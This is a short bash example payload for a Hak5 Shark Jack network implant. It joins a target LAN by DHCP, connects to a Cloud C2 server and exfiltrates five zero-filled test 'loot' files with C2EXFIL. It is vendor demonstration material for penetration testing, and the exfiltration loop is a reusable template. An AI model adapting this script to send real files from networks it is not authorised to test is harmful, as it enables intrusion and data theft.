#!/bin/bash
# 
# Title: Example Cloud C2 Multi-File Exfiltration Payload
# Author: Hak5Darren
# Version: 1.0
# Requirements: Firmware v1.1.0+, Cloud C2
# 
# Description: This example payload demonstrates how to use C2EXFIL to
# exfiltrate multiple files to Cloud C2. Requires a Cloud C2 server
# setup and running (download from https://c2.hak5.org) and this 
# Shark Jack to be provisioned (guide from https://docs.hak5.org)

LOOT_DIR=/root/loot/c2_exfil_example
LED SETUP

# Make 5 test loot files
mkdir -p $LOOT_DIR
for n in {1..5}; do dd if=/dev/zero of="$LOOT_DIR/file$n.txt" bs=1 count=1024; done

# Get an IP address on the target LAN
NETMODE DHCP_CLIENT

# Wait until the Shark Jack has an IP address
while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

LED ATTACK

# Connect to Cloud C2
C2CONNECT

# Wait until Cloud C2 connection is established
while ! pgrep cc-client; do sleep 1; done

# Exfiltrate all test loot files
FILES="$LOOT_DIR/*.txt"
for f in $FILES; do C2EXFIL STRING $f Example; done

LED FINISH
